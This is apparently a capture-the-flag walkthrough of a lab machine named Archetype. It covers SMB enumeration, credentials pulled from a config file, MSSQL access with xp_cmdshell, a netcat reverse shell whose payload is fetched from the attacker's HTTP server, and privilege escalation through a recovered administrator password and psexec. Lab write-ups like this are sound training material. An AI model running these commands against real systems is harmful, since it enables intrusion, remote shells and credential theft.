# Archetype

## Initial Reconnaissance
- **Port Scan:** 
```sudo nmap -sC -sV 10.129.238.100 # port scan on the ip```
- Discovered database server port as `1433`.

- **SMB Enumeration:**``
```smbclient -N -L 10.129.238.100 # list share over SMB```
- Identified a non-administrative share named `backups`.

- **Accessing the Share:**
```smbc lient -N \\\\10.129.238.100\\backups #going in the onlynon-admin share```
- Found file `prod.dtsConfig` and downloaded it using `get prod.dtsConfig`.
- Revealed credentials: `M3g4c0rp123` for user `ARCHETYPE\sql_svc`.

## Exploitation

- **MS SQL Server Connection:**
- Installed `mssqlclient.py` using:
  ```
  git clone https://github.com/SecureAuthCorp/impacket.git
  cd impacket
  pip3 install -r requirements.txt
  sudo python3 setup.py install
  ```
- Connected to SQL Server with credentials:
  ```
  python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.240.43 -windows-auth
  ```
  - Enabled `xp_cmdshell` for Windows command execution.

- **Reverse Shell Setup:**
- Started HTTP server and Netcat listener:
  ```
  sudo python3 -m http.server 80
  sudo nc -lvnp 443
  ```
- Uploaded `nc64.exe` to the target:
  ```
  xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{my_ip_adress}/nc64.exe -outfile nc64.exe"
  ```
- Executed `nc64.exe` for reverse shell:
  ```
  xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {my_ip_adress} 443"
  ```
  - Acquired user flag at `C:\Users\sql_svc\Desktop\user.txt`.

## Privilege Escalation

- **WinPEAS Analysis:**
- Downloaded WinPEAS: [WinPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe).
- Executed WinPEAS:
  ```
  .\winPEASx64.exe
  ```
  - Identified a vulnerable file: `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
  - Discovered administrator password: `MEGACORP_4dm1n!!`.

- **Escalating Privileges:**
- Connected as administrator using Impacket:
  ```
  python3 psexec.py administrator@10.129.238.100
  ```
  - Accessed administrator's desktop and retrieved the flag at `root.txt`.



